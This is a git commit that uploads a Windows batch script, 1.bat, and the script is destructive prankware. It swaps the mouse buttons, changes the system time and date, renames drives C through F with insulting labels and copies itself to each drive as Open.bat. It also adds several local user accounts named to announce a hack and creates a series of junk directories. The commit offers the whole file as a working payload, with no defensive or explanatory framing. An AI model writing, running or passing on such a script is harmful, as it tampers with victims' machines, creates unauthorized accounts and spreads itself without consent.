0a56e70dbc6a27792903b0cbc4b19068d0fca59f
hyinegrov <62652886+Alexsanger@users.noreply.github.com>
2022-11-27 00:33:48 +0600

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,31 @@
+@echo off
+%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
+time 0:00 >nul
+date 13.06.23 >nul
+label C:IDIOT >nul
+label D:DURAK >nul
+label E:SUKA >nul
+label F:GANDON >nul
+copy %0 C:\Open.bat >nul
+copy %0 D:\Open.bat >nul
+copy %0 E:\Open.bat >nul
+copy %0 F:\Open.bat >nul
+net user "Idiot you Hacked" /add >nul
+net user "Bitch you Hacked" /add >nul
+net user "Durak you Hacked" /add >nul
+net user "Kritin you Hacked" /add >nul
+net user "Gavno you Hacked" /add >nul
+md 1 >nul
+md 2 >nul
+md 3 >nul
+md 4 >nul
+md 5 >nul
+md 6 >nul
+md 7 >nul
+md 8 >nul
+md 9 >nul
+md 10 >nul
+md 11 >nul
+md 12 >nul
+md 13 >nul
+md 14 >nul
